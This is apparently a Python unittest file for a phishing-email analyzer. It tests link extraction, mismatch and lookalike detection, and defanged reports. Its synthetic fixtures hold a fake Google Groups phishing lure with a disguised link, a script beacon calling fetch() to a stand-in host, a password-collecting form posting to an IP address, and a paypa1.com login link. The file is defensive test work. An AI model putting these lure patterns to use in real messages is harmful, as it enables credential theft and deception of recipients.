"""Body inspection: extraction safety, link checks, and platform accounts.

All messages are synthetic. The Google Groups lure uses real Google addresses
only because the platform list matches them; every attacker domain is .example.
"""

import socket
import unittest
from unittest import mock

from phishing_header_analyzer.body import MAX_BODY_CHARS, extract, host_of
from phishing_header_analyzer.checks import run_all
from phishing_header_analyzer.config import Config
from phishing_header_analyzer.parser import parse_bytes
from phishing_header_analyzer.report import build_report, to_json, to_markdown

GMAIL = Config(trusted_authserv_ids=["mx.google.com"])

GROUPS_HEADERS = b"""\
Return-Path: <noreply@groups.google.com>
Received: from mail-sor-f69.google.com (mail-sor-f69.google.com. [209.85.220.69])
        by mx.google.com with SMTPS id abc123
        for <victim@gmail.com>; Mon, 19 Oct 2026 10:06:46 -0700 (PDT)
Authentication-Results: mx.google.com;
       dkim=pass header.i=@google.com header.s=20251104 header.b=PqVQeT2y;
       spf=pass smtp.mailfrom=noreply@groups.google.com;
       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=google.com
From: Google Groups <noreply@groups.google.com>
To: victim@gmail.com
Subject: Invitation to join Start Connecting
Date: Mon, 19 Oct 2026 10:06:45 -0700
Message-ID: <groups-invite-0001@notifications.google.com>
MIME-Version: 1.0
"""

GROUPS_LURE = GROUPS_HEADERS + b"""\
Content-Type: multipart/mixed; boundary="MIX"

--MIX
Content-Type: multipart/alternative; boundary="ALT"

--ALT
Content-Type: text/plain; charset="UTF-8"

Bad Actor (bad.actor@freemail.example) has invited you (victim@gmail.com) to join
start-connecting@googlegroups.com. Claim your reward: https://claim-reward.example/r?id=TRACKING-TOKEN-123
Join: https://groups.google.com/g/start-connecting
--ALT
Content-Type: text/html; charset="UTF-8"

<p>Bad Actor invited you. <a href="https://claim-reward.example/r?id=TRACKING-TOKEN-123">https://accounts.google.com/verify</a></p>
<p><a href="https://groups.google.com/g/start-connecting">Join group</a>
<img src="https://www.gstatic.com/logo.png">
<a href="mailto:bad.actor@freemail.example">Contact the owner</a></p>
<script>fetch("https://script-only.example/beacon")</script>
<form action="http://198.51.100.77/collect"><input name="pw"></form>
--ALT--
--MIX
Content-Type: application/pdf; name="invoice.pdf"
Content-Disposition: attachment; filename="invoice.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQK
--MIX--
"""

GROUPS_BENIGN = GROUPS_HEADERS + b"""\
Content-Type: text/html; charset="UTF-8"

<p>Dana Ruiz (dana.ruiz@gmail.com) invited you to join book-club@googlegroups.com.</p>
<a href="https://groups.google.com/g/book-club">Join</a>
<a href="https://support.google.com/groups">Help</a>
"""


def ids(findings):
    return {f.check_id for f in findings}


def find(findings, check_id):
    return next(f for f in findings if f.check_id == check_id)


class NoNetworkTests(unittest.TestCase):
    """Proves body inspection never opens a connection, whatever the message contains."""

    def test_full_analysis_opens_no_sockets(self):
        def tripwire(*args, **kwargs):
            raise AssertionError("analysis attempted network access")

        with mock.patch.object(socket, "socket", tripwire), \
             mock.patch.object(socket, "create_connection", tripwire), \
             mock.patch.object(socket, "getaddrinfo", tripwire), \
             mock.patch.object(socket, "gethostbyname", tripwire):
            parsed = parse_bytes(GROUPS_LURE, inspect_body=True)
            report = build_report(parsed, GMAIL)
            to_markdown(report)
            to_json(report)
        self.assertTrue(report["body"]["inspected"])


class ExtractionTests(unittest.TestCase):
    def setUp(self):
        self.body = extract(GROUPS_LURE)

    def test_link_domains_from_real_targets(self):
        self.assertEqual(set(self.body.link_domains),
                         {"claim-reward.example", "groups.google.com", "198.51.100.77"})

    def test_image_and_script_urls_ignored(self):
        self.assertNotIn("www.gstatic.com", self.body.link_domains)      # images aren't links
        self.assertNotIn("script-only.example", self.body.link_domains)  # script text skipped

    def test_link_text_is_not_a_destination(self):
        self.assertNotIn("accounts.google.com", self.body.link_domains)

    def test_attachment_skipped(self):
        self.assertEqual(self.body.skipped_attachments, 1)
        self.assertEqual((self.body.text_parts, self.body.html_parts), (1, 1))

    def test_addresses(self):
        self.assertIn("bad.actor@freemail.example", self.body.addresses)
        self.assertIn("start-connecting@googlegroups.com", self.body.addresses)

    def test_mismatch(self):
        self.assertEqual([(m.shown, m.actual) for m in self.body.mismatches],
                         [("accounts.google.com", "claim-reward.example")])

    def test_host_of(self):
        self.assertEqual(host_of("https://User@Example.COM:8443/x?y=1"), "example.com")
        self.assertEqual(host_of("https://nоrthwind.example/"), "xn--nrthwind-nbh.example")
        self.assertIsNone(host_of("javascript:alert(1)"))
        self.assertIsNone(host_of("ftp://files.example/"))
        self.assertIsNone(host_of("https://[not-an-ip/"))

    def test_size_cap(self):
        huge = b"From: a@x.example\nContent-Type: text/plain\n\n" + b"a" * (MAX_BODY_CHARS + 10)
        self.assertTrue(extract(huge).truncated)

    def test_malformed_mime_does_not_crash(self):
        bad = b"From: a@x.example\nContent-Type: multipart/mixed; boundary=\"Q\"\n\n--Q\nContent-Type: text/html\n\n<a href=\"https://x"
        extract(bad)  # no exception


class LinkCheckTests(unittest.TestCase):
    def test_groups_lure(self):
        findings = run_all(parse_bytes(GROUPS_LURE, inspect_body=True), GMAIL)
        self.assertTrue({"PLATFORM-NOTIFICATION", "LINK-OFF-PLATFORM", "PLATFORM-ACCOUNTS",
                         "LINK-TEXT-MISMATCH", "LINK-IP-LITERAL"} <= ids(findings))
        self.assertEqual(find(findings, "LINK-OFF-PLATFORM").evidence["domains"], ["claim-reward.example"])
        accounts = find(findings, "PLATFORM-ACCOUNTS").evidence["accounts"]
        self.assertIn("bad.actor@freemail.example", accounts)
        self.assertIn("start-connecting@googlegroups.com", accounts)
        self.assertNotIn("victim@gmail.com", accounts)   # the recipient isn't an indicator

    def test_benign_invite_has_no_link_findings(self):
        findings = run_all(parse_bytes(GROUPS_BENIGN, inspect_body=True), GMAIL)
        self.assertEqual(ids(findings), {"PLATFORM-NOTIFICATION", "PLATFORM-ACCOUNTS"})

    def test_headers_only_runs_no_link_checks(self):
        found = ids(run_all(parse_bytes(GROUPS_LURE), GMAIL))
        self.assertEqual(found, {"PLATFORM-NOTIFICATION"})

    def test_link_lookalike(self):
        raw = (b"From: a@shop.example\nContent-Type: text/html\n\n"
               b'<a href="https://paypa1.com/login">Sign in</a>')
        found = ids(run_all(parse_bytes(raw, inspect_body=True), Config()))
        self.assertIn("LINK-LOOKALIKE-HOMOGLYPH", found)

    def test_private_ip_links_not_flagged(self):
        raw = b"From: a@x.example\nContent-Type: text/plain\n\nIntranet: http://10.0.0.5/wiki\n"
        self.assertNotIn("LINK-IP-LITERAL", ids(run_all(parse_bytes(raw, inspect_body=True), Config())))

    def test_custom_platform_link_domains(self):
        cfg = Config(trusted_authserv_ids=["mx.google.com"],
                     platform_link_domains={"google.com": ["google.com", "claim-reward.example"]})
        found = ids(run_all(parse_bytes(GROUPS_LURE, inspect_body=True), cfg))
        self.assertNotIn("LINK-OFF-PLATFORM", found)


class BodyReportTests(unittest.TestCase):
    def test_actions_name_the_indicators(self):
        report = build_report(parse_bytes(GROUPS_LURE, inspect_body=True), GMAIL)
        self.assertEqual(report["risk"]["level"], "high")
        actions = {a["because"][0]: a for a in report["recommended_actions"]}
        # The generic "find the account" step is replaced by the named accounts.
        accounts = actions["PLATFORM-NOTIFICATION"]
        self.assertEqual(accounts["because"], ["PLATFORM-NOTIFICATION", "PLATFORM-ACCOUNTS"])
        self.assertIn("bad.actor@freemail.example", accounts["subjects"])

    def test_no_full_urls_or_tokens_anywhere(self):
        report = build_report(parse_bytes(GROUPS_LURE, inspect_body=True), GMAIL)
        for text in (to_json(report), to_markdown(report), to_markdown(report, do_defang=False)):
            self.assertNotIn("TRACKING-TOKEN-123", text)
            self.assertNotIn("/r?id=", text)

    def test_markdown_defangs_body_indicators(self):
        md = to_markdown(build_report(parse_bytes(GROUPS_LURE, inspect_body=True), GMAIL))
        self.assertIn("## Message Body", md)
        self.assertIn("claim-reward[.]example", md)
        self.assertIn("bad.actor@freemail[.]example", md)
        self.assertNotIn("claim-reward.example", md)

    def test_not_inspected_says_how_to_enable(self):
        md = to_markdown(build_report(parse_bytes(GROUPS_LURE), GMAIL))
        self.assertIn("Not inspected (headers only)", md)
        self.assertIn("--inspect-body", md)
        self.assertEqual(build_report(parse_bytes(GROUPS_LURE), GMAIL)["body"], {"inspected": False})


if __name__ == "__main__":
    unittest.main()
